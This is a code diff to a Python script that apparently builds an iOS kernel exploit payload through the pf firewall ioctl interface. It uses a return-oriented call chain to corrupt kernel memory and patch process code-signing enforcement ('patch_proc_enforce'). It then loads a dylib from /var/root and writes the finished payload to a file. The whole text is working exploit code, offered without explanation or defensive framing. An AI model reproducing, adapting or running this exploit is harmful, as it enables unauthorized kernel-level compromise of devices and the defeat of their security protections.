@@ -40,19 +40,15 @@ funcall('_ioctl', pffd, DIOCSTOP, load_r0=True)
 funcall('_ioctl', pffd, DIOCSTART, load_r0=True)
 
 pr = ptr(open('transe_pr.bin').read())
-def pwn(addrs):
+def pwn(addr):
     funcall('_ioctl', pffd, DIOCXBEGIN, trans, load_r0=True)
     funcall('_ioctl', pffd, DIOCBEGINADDRS, pr + 8 - 4, load_r0=True)
     load_r0_from(trans_e + (4+1024))
     store_r0_to(pr + 4)
 
-    last = None
-    for addr in addrs:
-        if addr != last:
-            load_r0_from(ptrI(addr))
-            store_r0_to(pr + 0xad0)
-        funcall('_ioctl', pffd, DIOCADDRULE, pr, load_r0=True)
-        last = addr
+    load_r0_from(ptrI(addr - 0x4a4))
+    store_r0_to(pr + 0xad0)
+    funcall('_ioctl', pffd, DIOCADDRULE, pr, load_r0=True)
 
     funcall('_ioctl', pffd, DIOCXCOMMIT, trans, load_r0=True)
     load_r0_from(ptrI(5))
@@ -60,15 +56,16 @@ def pwn(addrs):
     funcall('_ioctl', pffd, DIOCCHANGERULE, pr, load_r0=True)
     # boom?
 
-pwn([cfg['#kern']['sysent_8_patch']] * 0x51)
+for addr in [cfg['#kern']['patch_proc_enforce']]:
+    pwn(addr)
+funcall('_ioctl', pffd, DIOCSTOP, load_r0=True)
+funcall('_close', pffd, load_r0=True)
+funcall('_exit', 0)
+funcall('_dlopen', ptr('/var/root/libpf2.dylib', True))
+funcall('_exit', 0)
 
-mback = marker().mark()
-mforward = marker()
+final = finalize(0x11000000+8)
+#(for debug)
+#heapdump(cache)
 
-condbranch_r0(mback, mforward)
-
-mforward.mark()
-
-final = finalize(0x10000000)
-heapdump(cache)
 open('transeboot.txt', 'w').write(final)
